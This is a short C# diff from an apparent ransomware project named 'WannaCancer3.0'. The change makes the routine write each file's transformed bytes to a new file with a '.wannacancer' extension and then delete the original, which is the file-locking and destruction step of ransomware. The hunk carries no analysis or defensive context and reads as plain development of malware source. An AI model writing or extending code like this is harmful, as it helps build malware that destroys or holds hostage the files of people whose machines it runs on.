@@ -142,9 +142,12 @@ namespace WannaCancer3._0
 
                 byte[] encrypt = new byte[fs.Length];
                 encrypt = Encoding.Default.GetBytes(charSet);
-                fs.Position = 0;
-                fs.Write(encrypt, 0, encrypt.Length);
                 fs.Close();
+
+                FileStream fsEncrypt = new FileStream(path + ".wannacancer", FileMode.Create);
+                fsEncrypt.Write(encrypt, 0, encrypt.Length);
+                fsEncrypt.Close();
+                File.Delete(path);
             }
             catch
             {
